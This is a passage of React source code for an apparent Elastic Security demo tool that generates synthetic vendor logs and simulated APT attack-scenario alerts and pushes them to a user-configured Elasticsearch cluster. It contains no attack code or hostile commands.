          {(vendor.id==='endpoint'||vendor.id==='windows'||vendor.id==='linux')&&(
            <div className="flex items-center justify-between mb-2">
              <span className="text-[10px] text-gray-500">Include admin users</span>
              <button type="button" onClick={()=>onIncludeAdmin(vendor.id,!includeAdmin)}
                className="relative flex items-center rounded-full transition-colors"
                style={{width:28,height:16,background:includeAdmin?'rgba(59,130,246,0.8)':'rgba(75,85,99,0.6)',border:'1px solid '+(includeAdmin?'rgba(59,130,246,0.6)':'rgba(107,114,128,0.4)')}}>
                <span style={{position:'absolute',width:10,height:10,borderRadius:'50%',background:'white',top:2,left:includeAdmin?14:2,transition:'left 0.15s'}}/>
              </button>
            </div>
          )}
          {vendor.id==='windows'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(WIN_TYPE_LABELS).map(([t,label])=>{
                  const isOptional=t==='applocker'||t==='powershell';
                  const checked=(windowsLogTypes||WIN_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{
                    e.stopPropagation();
                    const cur=windowsLogTypes||WIN_TYPES_DEFAULT;
                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                    if(next.length>0)onWindowsLogTypes(next);
                  };
                  return(
                    <button key={t} type="button" onClick={toggle}
                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
                      style={{background:checked?'rgba(34,197,94,0.15)':isOptional?'rgba(239,68,68,0.15)':'rgba(55,65,81,0.6)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':isOptional?'rgba(239,68,68,0.4)':'rgba(75,85,99,0.5)'}`,color:checked?'#86efac':isOptional?'#fca5a5':'#9ca3af'}}>
                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
                      {label}
                      {isOptional&&<span style={{fontSize:'8px',opacity:0.7,marginLeft:'1px'}}>opt</span>}
                    </button>
                  );
                })}
              </div>
            </div>
          )}
          {vendor.indices.length>0&&(
            <div className="space-y-0.5">
              {vendor.indices.slice(0,2).map(i=><p key={i} className="text-[9px] font-mono text-blue-400/80 truncate">{i}</p>)}
              {vendor.indices.length>2&&<p className="text-[9px] font-mono text-gray-500">+{vendor.indices.length-2} more</p>}
            </div>
          )}
          <div className="mt-2 pt-2 border-t border-blue-500/10">
            <label className="text-[10px] text-gray-500 block mb-1">Index override <span className="text-gray-600">(optional)</span></label>
            <input type="text" value={indexOverride||''} onChange={e=>onIndexOverride(vendor.id,e.target.value)} placeholder={vendor.indices[0]} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-[10px] font-mono text-gray-200 focus:outline-none focus:border-amber-500 placeholder:text-gray-600"/>
            {indexOverride&&vendor.indices.length>1&&<p className="text-[9px] text-amber-400/70 mt-0.5">⚠ Overrides all {vendor.indices.length} default indices</p>}
          </div>
          {integrationMissing&&<p className="text-[9px] text-amber-400 mt-1">⚠ Integration not in Fleet</p>}
        </div>
      )}
    </div>
  );
}

// Log Viewer
function LogViewer({logs,vendorLabels}){
  const [active,setActive]=useState(null);
  const [expanded,setExpanded]=useState(false);
  const sources=Object.keys(logs);
  const cur=active||sources[0];
  const curLogs=logs[cur]||[];
  if(!sources.length)return null;
  const total=sources.reduce((s,k)=>s+logs[k].length,0);
  const copy=()=>navigator.clipboard.writeText(curLogs.join('\n'));
  const dl=()=>{const b=new Blob([curLogs.join('\n')],{type:'text/plain'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`${cur}-logs.log`;a.click();URL.revokeObjectURL(u);};
  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="flex items-center justify-between p-3 border-b border-gray-700 flex-wrap gap-2">
        <div className="flex items-center gap-2">
          <span className="text-sm font-semibold text-white">Generated Logs</span>
          <Badge className="border-gray-600 text-gray-300 font-mono">{total} total</Badge>
        </div>
        <div className="flex gap-1.5">
          <Button size="sm" variant="outline" onClick={copy}>📋 Copy</Button>
          <Button size="sm" variant="outline" onClick={dl}>⬇ Download</Button>
          <Button size="sm" variant="ghost" onClick={()=>setExpanded(!expanded)}>{expanded?'⤓':'⤢'}</Button>
        </div>
      </div>
      {sources.length>1&&(
        <div className="flex gap-1 p-2 border-b border-gray-700 overflow-x-auto">
          {sources.map(s=>(
            <button key={s} onClick={()=>setActive(s)} className={cn("flex items-center gap-1.5 px-2.5 py-1 rounded-md text-xs font-medium transition-colors whitespace-nowrap",s===cur?"bg-blue-600 text-white":"text-gray-400 hover:text-white hover:bg-gray-700")}>
              {vendorLabels[s]||s}
              <span className="font-mono text-[10px] opacity-70">{logs[s].length}</span>
            </button>
          ))}
        </div>
      )}
      <div className={cn("overflow-auto bg-gray-950 transition-all",expanded?"max-h-[70vh]":"max-h-80")}>
        <pre className="p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap break-all">
          {curLogs.map((l,i)=>(
            <div key={i} className="hover:bg-gray-800/50 px-1 py-0.5 rounded flex gap-2">
              <span className="text-gray-600 select-none w-6 text-right shrink-0">{i+1}</span>
              <span>{l}</span>
            </div>
          ))}
        </pre>
      </div>
    </div>
  );
}

// APT Scenario Viewer
const SEV_COLOR={critical:'border-l-red-500',high:'border-l-orange-400',medium:'border-l-yellow-400',low:'border-l-blue-400'};
const SEV_DOT={critical:'bg-red-500',high:'bg-orange-400',medium:'bg-yellow-400',low:'bg-blue-400'};
const SEV_BADGE={critical:'border-red-500/40 text-red-400 bg-red-500/10',high:'border-orange-400/40 text-orange-400 bg-orange-400/10',medium:'border-yellow-400/40 text-yellow-300 bg-yellow-400/10',low:'border-blue-400/40 text-blue-400 bg-blue-400/10'};
const NOISE_LABELS={off:'No noise',low:'Low (~250 logs, 3 hosts)',medium:'Medium (~750 logs, 10 hosts)',high:'High (~1,650 logs, 20 hosts)'};

function APTScenarioViewer({scenario,data,elasticConfig}){
  const [noiseLevel,setNoiseLevel]=useState('medium');
  const [pushing,setPushing]=useState(false);
  const [pushResult,setPushResult]=useState(null);
  const [expanded,setExpanded]=useState({});
  const [showCurl,setShowCurl]=useState(false);
  const [showIocs,setShowIocs]=useState(false);
  if(!data?.alerts?.length)return null;
  const {meta,ctx,alerts}=data;
  const crits=alerts.filter(a=>a.kibana.alert.severity==='critical').length;
  const toggle=i=>setExpanded(p=>({...p,[i]:!p[i]}));

  const push=async()=>{
    if(!elasticConfig?.url){alert('No Elasticsearch config found');return;}
    setPushing(true);setPushResult(null);
    try{
      const bulkLines=[];
      // 1. Attack alerts → .alerts-security.alerts-default
      alerts.forEach(a=>{
        bulkLines.push(JSON.stringify({create:{_index:'.alerts-security.alerts-default'}}));
        bulkLines.push(JSON.stringify(a));
      });
      // 2. Scenario-correlated logs (real IOCs — firewall + endpoint)
      const coreLogs=generateScenarioCoreLogs(ctx,meta.timeRange);
      Object.entries(coreLogs).forEach(([vid,rawLogs])=>{
        const ing=VENDOR_INGEST[vid];if(!ing)return;
        rawLogs.forEach(raw=>{
          bulkLines.push(JSON.stringify({create:{_index:ing.getIndex(raw)}}));
          bulkLines.push(JSON.stringify(ing.toDoc(raw)));
        });
      });
      const coreCount=Object.values(coreLogs).reduce((s,l)=>s+l.length,0);
      // 3. Background noise → vendor indices
      const noise=generateScenarioNoise(noiseLevel);
      Object.entries(noise).forEach(([vid,rawLogs])=>{
        const ing=VENDOR_INGEST[vid];if(!ing)return;
        rawLogs.forEach(raw=>{
          bulkLines.push(JSON.stringify({create:{_index:ing.getIndex(raw)}}));
          bulkLines.push(JSON.stringify(ing.toDoc(raw)));
        });
      });
      const noiseCount=Object.values(noise).reduce((s,l)=>s+l.length,0);
      const res=await fetch(`${elasticConfig.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(elasticConfig),body:bulkLines.join('\n')+'\n'});
      if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      const d=await res.json();
      const errs=d.items?.filter(i=>i.create?.error||i.index?.error)||[];
      setPushResult({alerts:alerts.length,core:coreCount,noise:noiseCount,errors:errs.length,firstError:errs[0]?.create?.error?.reason||errs[0]?.index?.error?.reason});
    }catch(e){setPushResult({error:e.message});}
    finally{setPushing(false);}
  };

  const curl=elasticConfig?`curl -X POST "${elasticConfig.url.replace(/\/$/,'')}/_bulk" \\\n  -H "Authorization: ApiKey ${elasticConfig.apiKey}" \\\n  -H "Content-Type: application/x-ndjson" \\\n  --data-binary @apt-alerts.ndjson`:'';

  const dl=()=>{
    const coreLogs=generateScenarioCoreLogs(ctx,meta.timeRange);
    const noise=generateScenarioNoise(noiseLevel);
    const vendorLines=logs=>Object.entries(logs).flatMap(([vid,rawLogs])=>{const ing=VENDOR_INGEST[vid];if(!ing)return[];return rawLogs.map(raw=>`${JSON.stringify({create:{_index:ing.getIndex(raw)}})}\n${JSON.stringify(ing.toDoc(raw))}`);});
    const lines=[
      ...alerts.map(a=>`${JSON.stringify({create:{_index:'.alerts-security.alerts-default'}})}\n${JSON.stringify(a)}`),
      ...vendorLines(coreLogs),
      ...vendorLines(noise),
    ];
    const b=new Blob([lines.join('\n')+'\n'],{type:'application/x-ndjson'});
    const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`${scenario.id}-alerts.ndjson`;a.click();URL.revokeObjectURL(u);
  };

  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="p-4 border-b border-gray-700 space-y-3">
        <div className="flex items-start justify-between flex-wrap gap-2">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="text-sm font-semibold text-white">{meta.name}</span>
              <Badge className="border-red-500/40 text-red-400 bg-red-500/10">{alerts.length} alerts</Badge>
              {crits>0&&<Badge className="border-red-500/40 text-red-400 bg-red-500/5">{crits} critical</Badge>}
              <Badge className="border-purple-500/40 text-purple-400 bg-purple-500/10">APT</Badge>
            </div>
            <p className="text-xs text-gray-400 max-w-2xl">{meta.description}</p>
            <p className="text-[10px] text-gray-500 mt-1">Attacker: <span className="text-gray-400">{meta.attackerProfile}</span> · Alerts index: <span className="font-mono text-blue-400/80">.alerts-security.alerts-default</span></p>
          </div>
        </div>
        {ctx&&<div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3 space-y-2">
          <button onClick={()=>setShowIocs(s=>!s)} className="flex items-center gap-2 w-full text-left">
            <span className="text-[11px] font-semibold text-amber-400">IOC Summary</span>
            <Badge className="border-amber-500/30 text-amber-400/80 bg-amber-500/10 text-[9px]">Real APT29 IOCs — VirusTotal detectable</Badge>
            <span className="text-[10px] text-gray-500 ml-auto">{showIocs?'▲ hide':'▼ show'}</span>
          </button>
          {showIocs&&<div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
            <div className="space-y-1">
              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Malware</p>
              <div className="space-y-0.5">
                <p className="text-[10px] text-gray-500">Family: <span className="text-amber-300 font-mono">{ctx.malwareFamily}</span></p>
                <p className="text-[10px] text-gray-500">File: <span className="text-gray-300 font-mono">{ctx.malwareFile}</span></p>
                <p className="text-[10px] text-gray-500 break-all">SHA256: <span className="text-red-400 font-mono">{ctx.malwareHash}</span></p>
              </div>
            </div>
            <div className="space-y-1">
              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Network IOCs</p>
              <div className="space-y-0.5">
                <p className="text-[10px] text-gray-500">C2 IP #1: <span className="text-red-400 font-mono">{ctx.c2IP}</span></p>
                <p className="text-[10px] text-gray-500">C2 IP #2: <span className="text-red-400 font-mono">{ctx.c2IP2}</span></p>
                <p className="text-[10px] text-gray-500">C2 Domain: <span className="text-orange-400 font-mono">{ctx.c2Domain}</span></p>
                <p className="text-[10px] text-gray-500">Phishing: <span className="text-orange-400 font-mono">{ctx.phishingDomain}</span></p>
              </div>
            </div>
          </div>}
        </div>}
        <div className="flex items-center gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            <span className="text-[10px] text-gray-500">Background noise:</span>
            {['off','low','medium','high'].map(l=>(
              <button key={l} onClick={()=>setNoiseLevel(l)} className={cn('px-2 py-0.5 rounded text-[10px] font-medium transition-colors',noiseLevel===l?'bg-blue-500 text-white':'bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white')}>
                {l.charAt(0).toUpperCase()+l.slice(1)}
              </button>
            ))}
            {noiseLevel!=='off'&&<span className="text-[10px] text-gray-600">{NOISE_LABELS[noiseLevel]}</span>}
          </div>
          <div className="flex gap-1.5 ml-auto flex-wrap">
            <Button size="sm" variant="outline" onClick={dl}>⬇ NDJSON</Button>
            {elasticConfig?.url&&<><Button size="sm" variant="outline" onClick={()=>setShowCurl(!showCurl)}>$ curl</Button><Button size="sm" onClick={push} disabled={pushing}>{pushing?'Pushing…':'⬆ Push to ES'}</Button></>}
          </div>
        </div>
        {showCurl&&curl&&<pre className="bg-gray-950 rounded-lg p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap">{curl}</pre>}
        {pushResult&&!pushResult.error&&(
          <div className={cn('flex items-center gap-2 p-2 rounded-lg text-xs',pushResult.errors>0?'bg-amber-500/10 border border-amber-500/30 text-amber-300':'bg-green-500/10 border border-green-500/30 text-green-400')}>
            {pushResult.errors>0?'⚠':'✓'} Pushed {pushResult.alerts} attack alerts + {pushResult.core} correlated logs + {pushResult.noise} noise logs{pushResult.errors>0?` — ${pushResult.errors} errors: ${pushResult.firstError}`:''}
          </div>
        )}
        {pushResult?.error&&<div className="flex items-center gap-2 p-2 rounded-lg text-xs bg-red-500/10 border border-red-500/30 text-red-400">✗ {pushResult.error}</div>}
      </div>
      <div className="p-4 space-y-2 max-h-[600px] overflow-y-auto">
        {alerts.map((a,i)=>{
          const sev=a.kibana.alert.severity;
          const rule=a.kibana.alert.rule;
          const threat=rule.threat?.[0];
          return(
            <div key={i} className={cn('border-l-2 bg-gray-800/40 rounded-r-lg overflow-hidden',SEV_COLOR[sev])}>
              <div className="flex items-start gap-3 p-3 cursor-pointer hover:bg-gray-700/30 transition-colors" onClick={()=>toggle(i)}>
                <div className="flex items-center gap-2 shrink-0 pt-0.5">
                  <span className="text-[10px] font-mono text-gray-500 w-4 text-right">{i+1}</span>
                  <div className={cn('w-2 h-2 rounded-full shrink-0',SEV_DOT[sev])}/>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                    <Badge className={SEV_BADGE[sev]}>{sev}</Badge>
                    <span className="text-xs font-medium text-white">{rule.name}</span>
                  </div>
                  <div className="flex items-center gap-3 flex-wrap">
                    <span className="text-[10px] text-gray-400">🖥 {a.host.name}</span>
                    <span className="text-[10px] text-gray-400">👤 {a.user.name}</span>
                    {a.process?.name&&<span className="text-[10px] text-gray-500 font-mono">{a.process.name}</span>}
                  </div>
                  {threat&&<p className="text-[10px] text-purple-400/80 mt-0.5">{threat.tactic.name} · {threat.technique?.[0]?.id} {threat.technique?.[0]?.name}</p>}
                </div>
                <span className="text-gray-500 text-xs shrink-0">{expanded[i]?'▲':'▼'}</span>
              </div>
              {expanded[i]&&<pre className="text-[10px] p-3 pt-0 text-gray-400 whitespace-pre-wrap break-all border-t border-gray-700/50 bg-gray-950/50 font-mono">{JSON.stringify(a,null,2)}</pre>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// Scenario Viewer
function ScenarioViewer({scenario,events,elasticConfig}){
  const [pushing,setPushing]=useState(false);
  const [expanded,setExpanded]=useState({});
  const [showCurl,setShowCurl]=useState(false);
  if(!events?.length)return null;
  const toggle=(i)=>setExpanded(p=>({...p,[i]:!p[i]}));
  const SCOLOR={critical:'border-l-red-500',high:'border-l-orange-400',medium:'border-l-yellow-400',low:'border-l-blue-400'};
  const SDOT={critical:'bg-red-500',high:'bg-orange-400',medium:'bg-yellow-400',low:'bg-blue-400'};
  const SRCCOLOR={'Elastic Security Alert':'text-red-400','Fortinet FortiGate':'text-orange-400','Microsoft Exchange':'text-blue-400','Endpoint Telemetry':'text-emerald-400','Windows Security':'text-purple-400','Palo Alto Networks':'text-orange-500','Linux / Syslog':'text-gray-400'};
  const dl=()=>{
    const ndjson=events.map(e=>{let doc;try{doc=JSON.parse(e.log);}catch{doc={message:e.log};}if(!doc['@timestamp'])doc['@timestamp']=e.timestamp.toISOString();let idx='logs-endpoint.events.process-default';if(e.source==='Elastic Security Alert')idx='.alerts-security.alerts-default';else if(e.source==='Fortinet FortiGate')idx='logs-fortinet.fortigate.utm-default';else if(e.source==='Windows Security')idx='logs-windows.security-default';return`${JSON.stringify({create:{_index:idx}})}\n${JSON.stringify(doc)}`;}).join('\n')+'\n';
    const b=new Blob([ndjson],{type:'application/x-ndjson'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`scenario-${scenario.id}.ndjson`;a.click();URL.revokeObjectURL(u);
  };
  const push=async()=>{
    if(!elasticConfig?.url)return;
    setPushing(true);
    try{
      const lines=events.map(e=>{let doc;try{doc=JSON.parse(e.log);}catch{doc={message:e.log};}if(!doc['@timestamp'])doc['@timestamp']=e.timestamp.toISOString();let idx='logs-endpoint.events.process-default';if(e.source==='Elastic Security Alert')idx='.alerts-security.alerts-default';else if(e.source==='Fortinet FortiGate')idx='logs-fortinet.fortigate.utm-default';else if(e.source==='Windows Security')idx='logs-windows.security-default';return`${JSON.stringify({create:{_index:idx}})}\n${JSON.stringify(doc)}`;});
      const res=await fetch(`${elasticConfig.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(elasticConfig),body:lines.join('\n')+'\n'});
      if(!res.ok)throw new Error(`HTTP ${res.status}`);
      alert(`✓ Pushed ${events.length} scenario events`);
    }catch(e){alert(`Push failed: ${e.message}`);}
    finally{setPushing(false);}
  };
  const curl=elasticConfig?`curl -X POST "${elasticConfig.url.replace(/\/$/,'')}/_bulk" \\\n  -H "Authorization: ApiKey ${elasticConfig.apiKey}" \\\n  -H "Content-Type: application/x-ndjson" \\\n  --data-binary @scenario-${scenario.id}.ndjson`:'';
  const crits=events.filter(e=>e.severity==='critical').length;
  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="p-4 border-b border-gray-700">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <div className="flex items-center gap-2">
            <span className="text-sm font-semibold text-white">{scenario.name}</span>
            <Badge className="border-gray-600 text-gray-300 font-mono">{events.length} events</Badge>
            {crits>0&&<Badge className="border-red-500/40 text-red-400 bg-red-500/10">{crits} critical</Badge>}
          </div>
          <div className="flex gap-1.5 flex-wrap">
            <Button size="sm" variant="outline" onClick={()=>navigator.clipboard.writeText(events.map(e=>e.log).join('\n'))}>📋 Copy</Button>
            <Button size="sm" variant="outline" onClick={dl}>⬇ NDJSON</Button>
            {elasticConfig?.url&&<><Button size="sm" variant="outline" onClick={()=>setShowCurl(!showCurl)}>$ curl</Button><Button size="sm" onClick={push} disabled={pushing}>{pushing?'Pushing…':'⬆ Push to ES'}</Button></>}
          </div>
        </div>
        {showCurl&&curl&&<pre className="mt-3 bg-gray-950 rounded-lg p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap">{curl}</pre>}
      </div>
      <div className="p-4 space-y-2 max-h-[550px] overflow-y-auto">
        {events.map((ev,i)=>{
          const pretty=()=>{try{return JSON.stringify(JSON.parse(ev.log),null,2);}catch{return ev.log;}};
          return(
            <div key={i} className={cn("border-l-2 bg-gray-800/40 rounded-r-lg overflow-hidden",SCOLOR[ev.severity])}>
              <div className="flex items-start gap-3 p-3 cursor-pointer hover:bg-gray-700/30 transition-colors" onClick={()=>toggle(i)}>
                <div className="flex items-center gap-2 shrink-0 pt-0.5">
                  <span className="text-[10px] font-mono text-gray-500 w-4 text-right">{ev.step}</span>
                  <div className={cn("w-2 h-2 rounded-full",SDOT[ev.severity])}/>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                    <span className={cn("text-xs font-medium",SRCCOLOR[ev.source]||'text-gray-400')}>{ev.source}</span>
                    <span className="text-[10px] text-gray-500 font-mono">{ev.tactic} • {ev.technique}</span>
                  </div>
                  <p className="text-xs text-gray-200 leading-relaxed">{ev.description}</p>
                  <p className="text-[10px] text-gray-500 mt-0.5 font-mono">{ev.timestamp.toLocaleTimeString()} — {ev.techniqueName}</p>
                </div>
                <span className="text-gray-500 text-xs">{expanded[i]?'▲':'▼'}</span>
              </div>
              {expanded[i]&&<pre className="text-[11px] p-3 pt-0 text-gray-400 whitespace-pre-wrap break-all border-t border-gray-700/50 bg-gray-950/50 font-mono">{pretty()}</pre>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── Main App ─────────────────────────────────────────────────────────────────
export default function App(){
  const [page,setPage]=useState('home');
  const [configOpen,setConfigOpen]=useState(false);
  const [elasticConfig,setElasticConfig]=useState(loadConfig);
  // Home state
  const [selected,setSelected]=useState([]);
  const [vendorRandomness,setVendorRandomness]=useState(VENDOR_RND_DEFAULT);
  const [vendorMinLogs,setVendorMinLogs]=useState(()=>
    Object.fromEntries(Object.entries(VENDOR_RND_DEFAULT).map(([id,lvl])=>[id,VENDOR_LOG_COUNT[id]?.[lvl]||50]))
  );
  const [maxLogs,setMaxLogs]=useState(500);
  const [timeRange,setTimeRange]=useState('60');
  const [logs,setLogs]=useState({});
  const [generating,setGenerating]=useState(false);
  const [pushing,setPushing]=useState(false);
  const [emailDomain,setEmailDomain]=useState('');
  const [windowsLogTypes,setWindowsLogTypes]=useState(WIN_TYPES_DEFAULT);
  const [vendorHostnamePrefix,setVendorHostnamePrefix]=useState({windows:'',linux:'',endpoint:''});
  const [vendorHostnameCap,setVendorHostnameCap]=useState({windows:null,linux:null,endpoint:null});
  const [vendorIncludeAdmin,setVendorIncludeAdmin]=useState({endpoint:false,windows:false,linux:false});
  const [vendorIndexOverride,setVendorIndexOverride]=useState({});
  // Scenarios state
  const [activeScenario,setActiveScenario]=useState(null);
  const [scenarioEvents,setScenarioEvents]=useState([]);
  const [aptScenarioData,setAptScenarioData]=useState(null);

  // Keep maxLogs >= sum of selected minimums
  useEffect(()=>{
    if(!selected.length)return;
    const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);
    setMaxLogs(prev=>Math.max(prev,sum));
  },[selected,vendorMinLogs]);

  const toggleVendor=useCallback(id=>setSelected(p=>p.includes(id)?p.filter(v=>v!==id):[...p,id]),[]);
  const handleRandomness=useCallback((id,lvl)=>{
    setVendorRandomness(p=>({...p,[id]:lvl}));
    if(id==='windows'){
      setWindowsLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
        return types;
      });
    } else {
      const def=VENDOR_LOG_COUNT[id]?.[lvl];
      if(def)setVendorMinLogs(p=>({...p,[id]:def}));
    }
  },[]);
  const handleWindowsLogTypes=useCallback((types)=>{
    setWindowsLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.windows||'med';
      const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleMinLogs=useCallback((id,val)=>{
    const n=Math.max(1,parseInt(val)||1);
    setVendorMinLogs(p=>({...p,[id]:n}));
  },[]);
  const handleHostnamePrefix=useCallback((id,val)=>setVendorHostnamePrefix(p=>({...p,[id]:val})),[]);
  const handleHostnameCap=useCallback((id,val)=>setVendorHostnameCap(p=>({...p,[id]:val===''?null:Math.max(1,parseInt(val)||1)})),[]);
  const handleIncludeAdmin=useCallback((id,val)=>setVendorIncludeAdmin(p=>({...p,[id]:val})),[]);
  const handleIndexOverride=useCallback((id,val)=>setVendorIndexOverride(p=>({...p,[id]:val})),[]);
  const handleGenerate=useCallback(()=>{
    setGenerating(true);
    setTimeout(()=>{
      // Step 1: each vendor gets its minimum
      const vendorTotals={};
      selected.forEach(vid=>{vendorTotals[vid]=Math.max(1,vendorMinLogs[vid]||50);});
      const sumMins=Object.values(vendorTotals).reduce((s,n)=>s+n,0);
      // Step 2: distribute remaining capacity randomly across selected vendors
      const remaining=Math.max(0,maxLogs-sumMins);
      if(remaining>0&&selected.length>0){
        const weights=selected.map(()=>Math.random()+0.1);
        const totalW=weights.reduce((s,w)=>s+w,0);
        let assigned=0;
        selected.forEach((vid,i)=>{
          const share=i===selected.length-1?remaining-assigned:Math.round(weights[i]/totalW*remaining);
          vendorTotals[vid]+=share;assigned+=share;
        });
      }
      // Step 3: generate
      const nl={};
      selected.forEach(vid=>{
        const v=VENDORS.find(x=>x.id===vid);if(!v)return;
        const lvl=vendorRandomness[vid]||'med';
        const prefix=['windows','linux','endpoint'].includes(vid)?(vendorHostnamePrefix[vid]?.trim()||null):null;
        _hostnamePrefix=prefix;
        const poolSize=vendorHostnameCap[vid]!=null?vendorHostnameCap[vid]:(VENDOR_POOL[vid]?.[lvl]??null);
        setPool(poolSize,prefix);
        _emailDomain=vid==='email'?(emailDomain.trim()||null):null;
        _includeAdminUsers=['endpoint','windows','linux'].includes(vid)?(vendorIncludeAdmin[vid]||false):false;
        nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
      });
      _emailDomain=null;
      _hostnamePrefix=null;
      _includeAdminUsers=false;
      setLogs(nl);setGenerating(false);
    },300);
  },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes]);

  const handlePush=useCallback(async()=>{
    setPushing(true);
    try{
      const{total,errors,indices}=await pushLogsToElastic(logs,vendorIndexOverride);
      const idxList=Object.entries(indices).map(([idx,n])=>`${idx}(${n})`).join(', ');
      if(errors>0)alert(`⚠ Pushed ${total-errors}/${total} logs. ${errors} errors.\n${idxList}`);
      else alert(`✓ Pushed ${total} logs across ${Object.keys(indices).length} indices\n${idxList}`);
    }catch(e){alert(`Error: ${e.message}`);}
    finally{setPushing(false);}
  },[logs,elasticConfig]);

  const handleScenario=s=>{
    setActiveScenario(s);
    if(s.type==='apt'){setAptScenarioData(s.generator());setScenarioEvents([]);}
    else{setScenarioEvents(s.generator());setAptScenarioData(null);}
  };
  const saveConfig=cfg=>{setElasticConfig(cfg);};

  const totalLogs=Object.values(logs).reduce((s,l)=>s+l.length,0);

  return(
    <div className="min-h-screen bg-gray-950 text-white" style={{fontFamily:'system-ui,sans-serif'}}>
      {/* Header */}
      <header className="border-b border-gray-800 bg-gray-900/80 backdrop-blur-sm sticky top-0 z-20">
        <div className="max-w-6xl mx-auto px-4 h-14 flex items-center justify-between gap-4">
          <div className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg bg-blue-500/20 flex items-center justify-center">🛡</div>
            <span className="font-bold text-sm">Elastic <span className="text-blue-400">Demo Forge</span></span>
          </div>
          <nav className="flex gap-1">
            {[{id:'home',label:'Log Generator',icon:'🛡'},{id:'scenarios',label:'Attack Scenarios',icon:'🚨'}].map(({id,label,icon})=>(
              <button key={id} onClick={()=>setPage(id)} className={cn("flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors",page===id?"text-blue-400 bg-blue-500/10":"text-gray-400 hover:text-white")}>
                <span>{icon}</span>{label}
              </button>
            ))}
          </nav>
          <button onClick={()=>setConfigOpen(true)} className={cn("flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs transition-colors",elasticConfig?.url?"border-blue-500/40 text-blue-400 hover:bg-blue-500/10":"border-gray-600 text-gray-400 hover:border-gray-400")}>
            🗄 {elasticConfig?.url?<><span className="max-w-[120px] truncate hidden sm:inline">{elasticConfig.url.replace(/^https?:\/\//,'')}</span><Badge className="border-blue-500/40 text-blue-400 bg-blue-500/10 ml-1 hidden sm:inline-flex">connected</Badge></>:'Connect ES'}
          </button>
        </div>
      </header>

      {/* Pages */}
      {page==='home'&&(
        <div className="min-h-screen">
          <div className="border-b border-gray-800 bg-gradient-to-b from-blue-500/5 to-transparent">
            <div className="max-w-6xl mx-auto px-4 py-8">
              <div className="flex flex-col sm:flex-row sm:items-end sm:justify-between gap-4">
                <div>
                  <div className="flex items-center gap-3 mb-2">
                    <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center text-xl">🛡</div>
                    <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Log Generator</h1>
                  </div>
                  <p className="text-sm text-gray-400 max-w-lg">Generate realistic vendor log data for Elastic Security demos. Select sources, configure volume, and push to your cluster.</p>
                </div>
                {totalLogs>0&&(
                  <div className="flex items-center gap-3 flex-wrap">
                    {Object.entries(logs).map(([id,l],i)=>{
                      const colors=['bg-blue-500','bg-emerald-500','bg-orange-500','bg-purple-500','bg-yellow-500','bg-red-500','bg-pink-500'];
                      return(<div key={id} className="flex items-center gap-1.5"><div className={cn("w-2 h-2 rounded-full",colors[i%colors.length])}/><span className="text-xs text-gray-400">{VENDORS.find(v=>v.id===id)?.name.split(' ')[0]}: <span className="font-mono font-semibold text-white">{l.length}</span></span></div>);
                    })}
                    <span className="text-xs font-mono font-semibold text-blue-400">{totalLogs} total</span>
                  </div>
                )}
              </div>
            </div>
          </div>
          <div className="max-w-6xl mx-auto px-4 py-8">
            <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
              <div className="lg:col-span-3">
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Log Sources</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-3">
